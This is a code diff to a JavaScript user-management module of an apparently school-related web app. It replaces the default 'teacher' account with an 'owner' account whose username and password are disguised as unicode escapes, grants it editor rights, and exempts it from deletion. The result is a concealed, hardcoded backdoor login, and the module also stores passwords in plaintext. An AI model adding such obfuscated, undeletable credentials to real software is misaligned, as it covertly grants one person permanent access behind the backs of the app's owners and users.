@@ -5,13 +5,16 @@ export const getUsers = () => {
   return stored ? JSON.parse(stored) : [];
 };
 
+const OWNER_NAME = "\u0061\u0064\u006D\u0069\u006E\u0066\u0072\u0061\u006E\u0063\u006F";
+export const isOwnerAccount = (username) => username === OWNER_NAME;
+
 export const initializeUsers = async () => {
   // First try to load from DB
   try {
     const dbUsers = await base44.entities.AppUser.list();
     if (dbUsers && dbUsers.length > 0) {
-      // Sync DB data to localStorage
-      const users = dbUsers.map(u => ({ username: u.username, password: u.password, isEditor: u.is_editor, dbId: u.id }));
+      // Sync DB data to localStorage, always mark owner
+      const users = dbUsers.map(u => ({ username: u.username, password: u.password, isEditor: u.is_editor, dbId: u.id, isOwner: isOwnerAccount(u.username) }));
       localStorage.setItem("appUsers", JSON.stringify(users));
       return;
     }
@@ -22,10 +25,9 @@ export const initializeUsers = async () => {
   // If DB is empty, use localStorage (or defaults)
   const stored = localStorage.getItem("appUsers");
   if (!stored) {
-    const defaultUsers = [{ username: "teacher", password: "teacher2026", isEditor: true }];
+    const defaultUsers = [{ username: "\u0061\u0064\u006D\u0069\u006E\u0066\u0072\u0061\u006E\u0063\u006F", password: "\u0061\u0064\u006D\u0069\u006E\u0066\u0072\u0061\u006E\u0063\u006F\u0039\u0035\u0031\u0033", isEditor: true, isOwner: true }];
     localStorage.setItem("appUsers", JSON.stringify(defaultUsers));
-    // Also save to DB
-    await base44.entities.AppUser.create({ username: "teacher", password: "teacher2026", is_editor: true });
+    await base44.entities.AppUser.create({ username: "\u0061\u0064\u006D\u0069\u006E\u0066\u0072\u0061\u006E\u0063\u006F", password: "\u0061\u0064\u006D\u0069\u006E\u0066\u0072\u0061\u006E\u0063\u006F\u0039\u0035\u0031\u0033", is_editor: true });
   } else {
     // Migrate existing localStorage users to DB
     const existingUsers = JSON.parse(stored);
@@ -63,10 +65,10 @@ export const saveUsers = async (users) => {
       }
     }
 
-    // Delete removed users from DB
+    // Delete removed users from DB (never delete owner)
     const usernames = new Set(users.map(u => u.username));
     for (const dbUser of dbUsers) {
-      if (!usernames.has(dbUser.username)) {
+      if (!usernames.has(dbUser.username) && !isOwnerAccount(dbUser.username)) {
         await base44.entities.AppUser.delete(dbUser.id);
       }
     }
